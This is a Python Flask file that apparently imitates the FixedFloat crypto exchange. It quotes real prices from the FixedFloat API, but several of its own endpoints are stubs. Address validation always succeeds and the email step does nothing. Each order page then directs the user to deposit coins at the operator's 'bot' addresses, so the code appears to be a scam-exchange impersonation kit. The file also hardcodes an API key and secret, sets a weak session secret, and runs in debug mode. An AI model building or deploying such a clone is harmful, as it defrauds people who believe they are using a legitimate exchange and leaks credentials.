import random
import string
from flask import Flask, render_template, send_from_directory, jsonify, request, redirect, url_for, session
from fixedfloatapi import FixedFloatApi
import requests
from collections import deque

app = Flask(__name__)
app.secret_key = 'FixedFloat'
apiKey = '47KzgXK3ME7lxLp0FMzNsQ4EG3fpMt70btYPRt7B'
apiSecret = 'f887rfl5JFycJc1s9JWALQNT3tk8oiWTO6EMHp5i'

fixedFloat = FixedFloatApi(key = apiKey, secret = apiSecret)

botAddresses = {
    'BTC': 'btc',
    'LTC': 'ltc',
    'ETH': 'eth',
    'SOL': 'sol',
    'USDT': 'usdt'
}

redirectLinks = deque()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/ajax/exchPrice', methods=['POST'])
def exchPrice():
    fromCcy = request.form.get('fromCcy')
    toCcy = request.form.get('toCcy')
    try:
        fromAmount = float(request.form.get('fromAmount'))
    except:
        pass

    price = fixedFloat.price({
        'fromCcy': fromCcy,
        'toCcy': toCcy,
        'amount': fromAmount,
        'direction': 'from',
        'type': 'fixed'
    })
    
    payload = {
        "code": 0,
        "msg": "OK",
        "data": price,
            "errors": [],
            "ccies":[{"code":"AAVEETH","recv":True,"send":True},{"code":"ADA","recv":True,"send":True},{"code":"ADABSC","recv":True,"send":True},{"code":"APT","recv":True,"send":True},{"code":"ATOM","recv":True,"send":True},{"code":"AVAX","recv":True,"send":True},{"code":"BAT","recv":True,"send":True},{"code":"BCH","recv":True,"send":True},{"code":"BNBOPBNB","recv":True,"send":True},{"code":"BSC","recv":True,"send":True},{"code":"BTC","recv":True,"send":True},{"code":"BTCLN","recv":True,"send":True},{"code":"BTCBSC","recv":False,"send":True},{"code":"BTT","recv":True,"send":True},{"code":"BUSDBSC","recv":False,"send":False},{"code":"BUSDETH","recv":False,"send":False},{"code":"BUSDTRC","recv":False,"send":False},{"code":"CAKE","recv":True,"send":True},{"code":"DAIBSC","recv":True,"send":True},{"code":"DAIETH","recv":True,"send":True},{"code":"DAIMATIC","recv":True,"send":True},{"code":"DASH","recv":True,"send":True},{"code":"DOGE","recv":True,"send":True},{"code":"DOT","recv":True,"send":True},{"code":"EOS","recv":True,"send":True},{"code":"ETC","recv":True,"send":True},{"code":"ETH","recv":True,"send":True},{"code":"ETHARBITRUM","recv":True,"send":False},{"code":"ETHBASE","recv":True,"send":True},{"code":"ETHBSC","recv":True,"send":False},{"code":"ETHOP","recv":True,"send":False},{"code":"ETHZKSYNC","recv":False,"send":True},{"code":"FTM","recv":True,"send":True},{"code":"KCS","recv":True,"send":True},{"code":"LINK","recv":True,"send":True},{"code":"LTC","recv":True,"send":True},{"code":"MANAETH","recv":True,"send":True},{"code":"MATICETH","recv":False,"send":False},{"code":"MKR","recv":True,"send":True},{"code":"PAXGETH","recv":True,"send":True},{"code":"POL","recv":True,"send":True},{"code":"POLETH","recv":True,"send":True},{"code":"SHIB","recv":True,"send":True},{"code":"SHIBBSC","recv":False,"send":True},{"code":"SOL","recv":False,"send":False},{"code":"TON","recv":True,"send":True},{"code":"TRX","recv":True,"send":True},{"code":"TWTBSC","recv":True,"send":True},{"code":"TUSD","recv":True,"send":False},{"code":"USDCARBITRUM","recv":True,"send":True},{"code":"USDCBSC","recv":True,"send":True},{"code":"USDCETH","recv":True,"send":True},{"code":"USDCMATIC","recv":True,"send":True},{"code":"USDCeARBITRUM","recv":False,"send":False},{"code":"USDCeMATIC","recv":False,"send":False},{"code":"USDCSOL","recv":False,"send":False},{"code":"USDCTRC","recv":False,"send":False},{"code":"USDP","recv":True,"send":True},{"code":"USDT","recv":True,"send":True},{"code":"USDTARBITRUM","recv":True,"send":True},{"code":"USDTBSC","recv":True,"send":True},{"code":"USDTMATIC","recv":True,"send":True},{"code":"USDTSOL","recv":False,"send":False},{"code":"USDTTRC","recv":True,"send":True},{"code":"VET","recv":True,"send":True},{"code":"VTHO","recv":False,"send":False},{"code":"WBNBBSC","recv":True,"send":True},{"code":"WBNBOPBNB","recv":False,"send":False},{"code":"WETHETH","recv":True,"send":True},{"code":"WETHARBITRUM","recv":True,"send":False},{"code":"WSOL","recv":False,"send":False},{"code":"XLM","recv":True,"send":True},{"code":"XMR","recv":True,"send":True},{"code":"XRP","recv":True,"send":True},{"code":"XTZ","recv":True,"send":True},{"code":"ZEC","recv":True,"send":True},{"code":"ZRX","recv":True,"send":True}]}

    return jsonify(payload)

@app.route('/ajax/exchCheckAddress', methods=['POST'])
def checkAddress():
    userAddress = request.form['address']
    return jsonify({
        'code': 0,
        'msg': 'OK',
        'data': {
            'valid': True,
            'amount': None,
            'result_address': userAddress,
            'valid_address': True
        }
    })


@app.route('/ajax/orderSetEmail', methods=['POST'])
def setEmail():
    return jsonify({"code": 0, "msg": "OK", "data": True})


@app.route('/ajax/exchCreate', methods=['POST'])
def exhCreate():
    userAddress = request.form['toAddress']
    firstCryptoShort = request.form['fromCcy']
    secondCryptoShort = request.form['toCcy']
    firstCryptoAmount = request.form['fromQty']
    orderStr = generateOrderId(6)
    price = fixedFloat.price({
        'fromCcy': firstCryptoShort,
        'toCcy': secondCryptoShort,
        'amount': firstCryptoAmount,
        'direction': 'from',
        'type': 'fixed'
    })

    secondCryptoAmount = price['to']['amount']

    redirectLinks.append(url_for('orderPage', orderId=orderStr))

    session['orderData'] = {
        'orderStr': orderStr,
        'firstCryptoAmount': secondCryptoAmount,
        'firstCryptoShort': secondCryptoShort,
        'secondCryptoAmount': firstCryptoAmount,
        'secondCryptoShort': firstCryptoShort,
        'userAddress': userAddress
    }

    return '', 200


@app.route('/ajax/checkRedirect', methods=['GET'])
def checkRedirect():
    redirectLink = redirectLinks.popleft() if redirectLinks else ''
    return jsonify({'redirectLink': redirectLink}), 200


@app.route('/<orderId>')
def orderPage(orderId):
    if 'orderData' in session and session['orderData']['orderStr'] == orderId:
        orderData = session['orderData']
        return render_template(
            'order.html',
            orderStr=orderData['orderStr'],
            firstCryptoAmount=orderData['firstCryptoAmount'],
            firstCryptoShort=orderData['firstCryptoShort'],
            secondCryptoAmount=orderData['secondCryptoAmount'],
            secondCryptoShort=orderData['secondCryptoShort'],
            userAddress=orderData['userAddress'],
            botAddress=botAddresses[orderData['secondCryptoShort']]
        ), 200

    return 'Order not found', 404


def generateOrderId(length=6):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

@app.route('/assets/<path:filePath>')
def serveAssets(filePath: str):
    return send_from_directory('assets', filePath)

@app.route('/media/<path:filePath>')
def serveMedia(filePath: str):
    return send_from_directory('media', filePath)


if __name__ == '__main__':
    app.run(debug=True)